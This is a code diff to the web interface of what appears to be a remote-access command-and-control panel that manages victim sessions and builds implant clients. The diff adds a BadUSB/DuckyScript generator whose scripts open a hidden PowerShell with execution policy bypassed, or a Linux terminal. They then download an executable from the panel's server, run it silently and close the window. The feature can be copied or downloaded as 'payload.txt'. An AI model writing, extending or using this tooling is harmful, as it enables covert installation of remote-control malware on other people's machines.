@@ -47,6 +47,11 @@ const app = state({
   paletteOpen: false, // Ctrl+K command palette
   paletteQuery: "",
   paletteIndex: 0, // selected row in the palette
+  modal: null, // "build" | "badusb" | null — which modal is open
+  badUsbOs: "linux",
+  badUsbArch: "amd64",
+  badUsbTags: "",
+  badUsbCopied: false,
 });
 
 const current = () => app.sessions.find((s) => s.id === app.currentId) || null;
@@ -109,6 +114,14 @@ function openPalette() {
 
 function closePalette() {
   app.paletteOpen = false;
+}
+
+function openModal(name) {
+  app.modal = name;
+}
+
+function closeModal() {
+  app.modal = null;
 }
 
 function paletteRunSelected() {
@@ -368,6 +381,63 @@ async function downloadClient() {
   }
 }
 
+// --- BadUSB / DuckyScript generator ----------------------------------------
+function badUsbDownloadUrl() {
+  const os = app.badUsbOs || "linux";
+  const arch = app.badUsbArch || "amd64";
+  const tags = app.badUsbTags || "";
+  const proto = location.protocol === "https:" ? "https://" : "http://";
+  const host = location.host;
+  const q = new URLSearchParams({ os, arch, tags });
+  return `${proto}${host}/dl?${q}`;
+}
+
+function badUsbScript() {
+  const url = badUsbDownloadUrl();
+  const os = app.badUsbOs || "linux";
+  const lines = [];
+  if (os === "windows" || os === "win") {
+    lines.push("GUI r");
+    lines.push("DELAY 500");
+    lines.push("STRING powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden");
+    lines.push("ENTER");
+    lines.push("DELAY 1000");
+    lines.push(`STRING $r=Invoke-WebRequest -Uri '${url}' -OutFile "$env:TEMP\\rsl.exe"; Start-Process "$env:TEMP\\rsl.exe"`);
+    lines.push("ENTER");
+  } else {
+    lines.push("CTRL ALT t");
+    lines.push("DELAY 800");
+    lines.push("STRING curl -sL '" + url + "' -o /tmp/.rsl && chmod +x /tmp/.rsl && /tmp/.rsl &");
+    lines.push("ENTER");
+    lines.push("DELAY 200");
+    lines.push("CTRL w");
+  }
+  return lines.join("\n");
+}
+
+async function copyBadUsbScript() {
+  const script = badUsbScript();
+  try {
+    await navigator.clipboard.writeText(script);
+    app.badUsbCopied = true;
+    setTimeout(() => (app.badUsbCopied = false), 1500);
+  } catch {
+    downloadBadUsbScript();
+  }
+}
+
+function downloadBadUsbScript() {
+  const script = badUsbScript();
+  const blob = new Blob([script], { type: "text/plain" });
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(blob);
+  a.download = "payload.txt";
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
+  URL.revokeObjectURL(a.href);
+}
+
 // --- Session list stream ---------------------------------------------------
 function connectSessionsStream() {
   const ws = new WebSocket(wsUrl("/api/ws/sessions"));
@@ -482,67 +552,169 @@ const hostRow = (h) =>
     )
   );
 
-const BuildPanel = () =>
+const ModalShell = ({ title, onClose, children }) =>
   el(
     "div",
-    { class: "build-panel" },
+    {
+      class: "modal-overlay",
+      onclick: (e) => {
+        if (e.target.classList.contains("modal-overlay")) onClose();
+      },
+    },
     el(
       "div",
-      { class: "list-group-label" },
-      el("span", {}, "Build client")
-    ),
-    el(
-      "label",
-      { class: "field" },
-      el("span", {}, "Server URL"),
-      el("input", {
-        type: "text",
-        placeholder: "ws://1.2.3.4:8080/mux",
-        value: () => app.buildServer,
-        oninput: (e) => (app.buildServer = e.target.value),
-      })
-    ),
-    el(
-      "label",
-      { class: "field" },
-      el("span", {}, "Tags"),
-      el("input", {
-        type: "text",
-        placeholder: "victim-1",
-        value: () => app.buildTags,
-        oninput: (e) => (app.buildTags = e.target.value),
-      })
-    ),
-    el(
-      "label",
-      { class: "field" },
-      el("span", {}, "Target"),
+      { class: "modal" },
       el(
-        "select",
-        {
-          onchange: (e) => (app.buildTarget = e.target.value),
-        },
-        list(
-          () => app.buildTargets,
-          (t) => t,
-          (t) =>
-            el(
-              "option",
-              { value: t, selected: () => app.buildTarget === t },
-              t
-            )
+        "div",
+        { class: "modal-header" },
+        el("div", { class: "modal-title" }, title),
+        el(
+          "button",
+          {
+            class: "btn micro",
+            onclick: onClose,
+            title: "Close",
+          },
+          "×"
         )
-      )
-    ),
-    el(
-      "button",
-      {
-        class: "btn",
-        disabled: () => app.building,
-        onclick: downloadClient,
-      },
-      () => (app.building ? "Building…" : "Download")
+      ),
+      el("div", { class: "modal-body" }, ...children)
     )
+  );
+
+const BuildModal = () =>
+  when(
+    () => app.modal === "build",
+    () =>
+      ModalShell({
+        title: "Build client",
+        onClose: closeModal,
+        children: [
+          el(
+            "label",
+            { class: "field" },
+            el("span", {}, "Server URL"),
+            el("input", {
+              type: "text",
+              placeholder: "ws://1.2.3.4:8080/mux",
+              value: () => app.buildServer,
+              oninput: (e) => (app.buildServer = e.target.value),
+            })
+          ),
+          el(
+            "label",
+            { class: "field" },
+            el("span", {}, "Tags"),
+            el("input", {
+              type: "text",
+              placeholder: "victim-1",
+              value: () => app.buildTags,
+              oninput: (e) => (app.buildTags = e.target.value),
+            })
+          ),
+          el(
+            "label",
+            { class: "field" },
+            el("span", {}, "Target"),
+            el(
+              "select",
+              {
+                onchange: (e) => (app.buildTarget = e.target.value),
+              },
+              list(
+                () => app.buildTargets,
+                (t) => t,
+                (t) =>
+                  el(
+                    "option",
+                    { value: t, selected: () => app.buildTarget === t },
+                    t
+                  )
+              )
+            )
+          ),
+          el(
+            "button",
+            {
+              class: "btn",
+              disabled: () => app.building,
+              onclick: downloadClient,
+            },
+            () => (app.building ? "Building…" : "Download")
+          ),
+        ],
+      })
+  );
+
+const BadUsbModal = () =>
+  when(
+    () => app.modal === "badusb",
+    () =>
+      ModalShell({
+        title: "BadUSB / DuckyScript",
+        onClose: closeModal,
+        children: [
+          el(
+            "label",
+            { class: "field" },
+            el("span", {}, "OS"),
+            el(
+              "select",
+              {
+                onchange: (e) => (app.badUsbOs = e.target.value),
+              },
+              el("option", { value: "linux", selected: () => app.badUsbOs === "linux" }, "linux"),
+              el("option", { value: "windows", selected: () => app.badUsbOs === "windows" }, "windows"),
+              el("option", { value: "darwin", selected: () => app.badUsbOs === "darwin" }, "darwin")
+            )
+          ),
+          el(
+            "label",
+            { class: "field" },
+            el("span", {}, "Arch"),
+            el(
+              "select",
+              {
+                onchange: (e) => (app.badUsbArch = e.target.value),
+              },
+              ["amd64", "arm64", "arm-7", "386", "mipsle-softfloat"].map((a) =>
+                el("option", { value: a, selected: () => app.badUsbArch === a }, a)
+              )
+            )
+          ),
+          el(
+            "label",
+            { class: "field" },
+            el("span", {}, "Tags"),
+            el("input", {
+              type: "text",
+              placeholder: "victim-1",
+              value: () => app.badUsbTags,
+              oninput: (e) => (app.badUsbTags = e.target.value),
+            })
+          ),
+          el(
+            "div",
+            { class: "ducky-preview" },
+            el("div", { class: "list-group-label" }, el("span", {}, "Script")),
+            el("pre", { class: "ducky-script" }, () => badUsbScript())
+          ),
+          el(
+            "div",
+            { class: "modal-actions" },
+            el(
+              "button",
+              { class: "btn", onclick: copyBadUsbScript },
+              () => (app.badUsbCopied ? "Copied!" : "Copy")
+            ),
+            el(
+              "button",
+              { class: "btn", onclick: downloadBadUsbScript },
+              "Download .txt"
+            )
+          ),
+        ],
+      })
   );
 
 const HostDetails = () =>
@@ -829,8 +1001,7 @@ const Sidebar = () =>
         () => deadSessions().length === 0,
         () => el("div", { class: "empty" }, "None")
       )
-    ),
-    BuildPanel()
+    )
   );
 
 const Hamburger = () =>
@@ -908,6 +1079,24 @@ const Toolbar = () =>
     el(
       "button",
       {
+        class: "btn",
+        onclick: () => openModal("build"),
+        title: "Cross-compile the Go client",
+      },
+      "Build"
+    ),
+    el(
+      "button",
+      {
+        class: "btn",
+        onclick: () => openModal("badusb"),
+        title: "Generate a DuckyScript payload",
+      },
+      "BadUSB"
+    ),
+    el(
+      "button",
+      {
         class: "btn danger",
         disabled: () => !current() || !current().alive,
         onclick: killCurrent,
@@ -950,7 +1139,7 @@ const SidebarBackdrop = () =>
 
 // --- Boot ------------------------------------------------------------------
 mount(document.getElementById("app"), () =>
-  el("div", { class: "app" }, Sidebar(), SidebarBackdrop(), Main(), HostDetails(), CommandPalette())
+  el("div", { class: "app" }, Sidebar(), SidebarBackdrop(), Main(), HostDetails(), CommandPalette(), BuildModal(), BadUsbModal())
 );
 
 connectSessionsStream();
